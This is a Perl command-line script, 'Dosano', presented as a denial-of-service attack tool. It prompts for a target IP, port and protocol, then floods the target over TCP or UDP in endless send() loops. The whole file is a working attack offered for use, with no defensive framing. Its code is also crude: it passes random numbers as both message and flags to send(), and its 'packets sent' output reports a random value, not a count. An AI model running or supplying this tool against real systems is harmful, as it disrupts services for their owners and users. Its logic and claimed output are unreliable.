#!/usr/bin/perl
#==============INFO==============#
# SCRIPT: Dosano
#    JOB: Denial Of Service Attack[DosAttack]
#CodedBy: Oseid Aldary

#=== Use Modules ===#
use IO::Socket;
use Scalar::Util qw(looks_like_number);
use IO::Handle;
#=== Clear Screen ===#
system("cls || clear");
#Script Banner================================================================
print q{ 
                   .-"      "-.  
                  /            \ 
                 |    JOKER11   | 
                 |,  .-.  .-.  ,| 
                 | )(__/  \__)( | 
                 |/     /\     \| 
       (@_       (_     ^^     _) 
  _     ) \_______\__|IIIIII|__/__________________________ 
 (_)@8@8{}<________|-\IIIIII/-|_A_N_O_N_Y_M_O_U_S_A_R_A_B_> 
        )_/        \          / 
       (@           `--------` Welcome! 

 [---]   by:> OSEID ALDARY   [---]
 =-------=-=-=-=-=-=-=-=-=-------=
};
# Check Intenret Connection !
print("\r[~] Checking Internet Connection [...]");
STDOUT->flush();
sleep(2);
my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com', 
	'PeerPort'=>80, 
	'Timeout'=>2, 
	'proto'=>'tcp');
if(!(defined $check && $check)){
        print("\r[-] Checking Internet Connection [Fail!]");
	print("\n[!] Error: Please Check Your Internet Connection !!!\n");
	exit(1);
}
$check->close();
print("\r[+] Checking Internet Connection [Connected]");
STDOUT->flush();
# INPUT TARGET INFO ==============================================

print("\n\n[~] Enter TargetIP: "); # Set Target IP
$host = <STDIN>;
chomp ($host);
while ($host eq ""){
 print "   [!] Enter TargetIP?: ";
 $host = <STDIN>;
 chomp ($host);
}
print "TRAGET ==> $host\n";
print "\n===============================";
print "\n[~] Enter Port: "; # Set Port
$port = <STDIN>;
chomp ($port);
while ($port eq "" || !looks_like_number($port) || !grep{$port eq $_}(0..65535)){ 
 print "   [!] Enter PORT?: ";       
 $port = <STDIN>;
 chomp ($port); 
} 
print "PORT ==> $port\n";
print "\n===============================";
print "\n[~] Enter Protockol (TCP or UDP) :"; # Set Protockol;
$proto = <STDIN>;
chomp ($proto);
while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
 print "   [!] Enter Protockol (TCP or UDP) ?: ";
 $proto = <STDIN>;
 chomp ($proto);
}
print "Protocol ==> $proto";
print "\n===============================\n";
sleep(1);

$sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
system("clear || cls");
print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
sleep(1);
if(grep{$proto eq $_} 'TCP','tcp'){
    while (1) {
       $sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
        for($i=0; $i<=500; $i++){
            $size = rand() * 8921873 * 99919988;
            send($sock, $size, $size);
            send($sock, $size*2, $size*2); 
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, $size*999999999999999,$size*999999999999999);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, $size*4, $size*4);
            send($sock, $size*3, $size*3);
            send($sock, $size*2, $size*2);
            send($sock, $size, $size);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, $size*999999999999999,$size*999999999999999);
            send($sock, $size*9999999999999,$size*9999999999999);

            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");
        }
    }

}else {
   $sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
   while (1) {
            $size = rand() * 8921873 * 99919988;
            send($sock, $size, $size);
            send($sock, $size*2, $size*2);
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, $size*999999999999999,$size*999999999999999);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, $size*4, $size*4);
            send($sock, $size*3, $size*3);
            send($sock, $size*2, $size*2);
            send($sock, $size, $size);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, $size*999999999999999,$size*999999999999999);
            send($sock, $size*9999999999999,$size*9999999999999);

            print ("Flooding: (=>$host:$port~$proto<=) Packets sent: $size\n");

   }
}
$sock->close()
##############################################################
#####################                #########################
#####################  END OF SCRIPT #########################
#####################                #########################
##############################################################
#This Script by Oseid Aldary
#Have a nice day :)
#GoodBye
